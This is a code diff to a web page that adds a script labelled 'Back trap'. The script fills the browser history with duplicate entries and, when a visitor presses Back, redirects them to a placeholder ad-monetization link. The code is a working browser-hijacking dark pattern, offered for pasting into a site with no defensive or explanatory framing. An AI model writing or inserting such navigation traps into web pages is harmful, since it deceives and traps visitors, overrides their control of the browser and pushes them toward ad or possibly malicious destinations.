@@ -1329,5 +1329,19 @@ footer {
     }
   </script>
 
+  <script>
+  // your existing JS code...
+
+  // Back trap — paste at the bottom
+  history.pushState(null, null, location.href);
+  history.pushState(null, null, location.href);
+
+  window.addEventListener('popstate', function() {
+    history.pushState(null, null, location.href);
+    history.pushState(null, null, location.href);
+    window.location.href = "https://YOUR-MONETAG-LINK-HERE.com";
+  });
+</script>
+
 
 <div id="extension-piigj"></div></body><div></div></html>
